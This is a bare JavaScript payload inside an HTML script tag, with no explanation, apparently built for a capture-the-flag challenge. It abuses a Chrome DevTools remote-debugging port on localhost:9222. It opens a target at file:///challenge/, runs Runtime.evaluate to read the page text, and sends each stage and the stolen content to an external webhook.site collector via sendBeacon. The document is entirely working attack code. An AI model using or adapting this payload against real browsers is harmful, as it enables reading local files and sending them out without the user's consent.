
<script>
const HOOK = "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";

function log(stage, data = {}) {
  navigator.sendBeacon(HOOK, JSON.stringify({stage, data}));
}

(async () => {
  try {
    const r = await fetch(
      "http://localhost:9222/json/new?file:///challenge/",
      {method: "PUT"}
    );

    const body = await r.text();
    log("cdp_response", {status: r.status, body});

    if (!r.ok) return;

    const t = JSON.parse(body);
    log("cdp_target", {url: t.url, ws: t.webSocketDebuggerUrl});

    const ws = new WebSocket(t.webSocketDebuggerUrl);

    ws.onopen = () => {
      log("ws_open");
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
          expression: "document.body.innerText",
          returnByValue: true
        }
      }));
    };

    ws.onmessage = e => log("cdp_result", {data: e.data});
    ws.onerror = () => log("ws_error");
  } catch (e) {
    log("exception", {message: e.message});
  }
})();
</script>
